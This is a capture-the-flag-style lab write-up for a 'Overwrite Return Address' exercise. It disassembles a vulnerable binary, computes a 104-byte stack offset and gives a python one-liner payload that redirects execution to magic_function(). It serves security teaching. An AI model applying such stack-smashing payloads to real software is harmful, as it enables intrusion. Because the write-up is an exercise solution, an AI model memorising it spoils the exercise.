---
nav_order: 1
parent: 'Task: Overwrite Return Address'
---

# Writeup

First use this command to scan the executable:

> ```Bash
> objdump -M intel -d break_this
> ```

- The `main()` function only calls `read_buffer()`.
- This function reads the length of a buffer from standard input into a variable `n`.
- Then it reads the buffer itself (`char buffer[64]`).
- Because `fgets()` reads at most `n - 1` characters, we can set `n` to a value bigger than the length of the buffer, so an overflow may be possible.
- We will set `n` to a large enough value: `130`
- `magic_function()` starts at address `0x00 00 00 00  00 40 11 86`
- We see that the buffer passed where `fgets()` reads starts at `rbp - 0x60`.
- At the address pointed by `rbp` we find the saved `rbp` which we must skip, followed by the return address that we need to overwrite.
- So we must use `0x60 + 8 = 104` dummy characters `A` and then the address of `magic_function()` in little-endian encoding.

We can find the address of the `magic_function()` using this command:

```console
student@hsi:/.../overwrite-ret-addr/support$ nm break_this | grep magic_function
00401186 T magic_function
```

``` Bash
python3 -c 'print("130\n" + "A" * 104 + "\x86\x11\x40\x00\x00\x00\x00\x00")' > payload
```
